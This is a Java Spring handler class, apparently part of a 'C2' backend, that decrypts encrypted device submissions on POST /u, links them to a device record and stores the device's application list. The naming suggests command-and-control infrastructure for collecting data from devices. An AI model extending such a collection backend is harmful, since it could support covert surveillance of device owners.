package com.consume.service.handlers;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Propagation;
import org.springframework.transaction.annotation.Transactional;

import com.consume.service.C2BusinessStore;
import com.consume.service.C2HandlerContext;
import com.consume.service.AbstractC2Handler;

/**
 * POST /u：应用列表（XADD.md §5.3）。
 *
 * 解密 → save_event_decrypt → save_applist → 关联 c2_records.device_id。
 */
@Component
public class HandleU extends AbstractC2Handler {

    @Autowired
    private C2BusinessStore store;

    @Override
    public String path() {
        return "/u";
    }

    @Override
    @Transactional(propagation = Propagation.REQUIRES_NEW, rollbackFor = Exception.class)
    public void handle(C2HandlerContext ctx) throws Exception {
        if (!"POST".equalsIgnoreCase(ctx.getMethod())) {
            log.info("正常日志:[c2_handlers] /u 非 POST，跳过, id={}", ctx.getRecordId());
            return;
        }
        resolveDomain(ctx);
        String plain = decrypt(ctx, "al", "d", "f", "u", "lhu");

        if (plain.isEmpty()) {
            log.info("异常日志:[c2_handlers] /u 解密失败，跳过业务, id={}", ctx.getRecordId());
            store.saveEventDecrypt(ctx, plain, ctx.getKeyLabel());
            return;
        }

        // 先解析/建设备，再落库，保证 applist.device_row_id 有值
        String d = ctx.plaintextStr("d");
        String f = ctx.plaintextStr("f");
        String u = ctx.plaintextStr("u");
        String lhu = ctx.plaintextStr("lhu");
        Long rowId = deviceResolver.resolveAndLink(ctx, d, f, u, null, null, null, lhu);

        store.saveEventDecrypt(ctx, plain, ctx.getKeyLabel());
        if (rowId == null) {
            log.info("异常日志:[c2_handlers] /u 无设备 rowId，跳过 applist, id={}, deviceid={}",
                    ctx.getRecordId(), ctx.getDeviceId());
            return;
        }
        store.saveApplist(ctx, ctx.getPlaintext());

        log.info("正常日志:[c2_handlers] call handle_u 完成, id={}, deviceRowId={}, deviceid={}",
                ctx.getRecordId(), ctx.getDeviceRowId(), ctx.getDeviceId());
    }
}
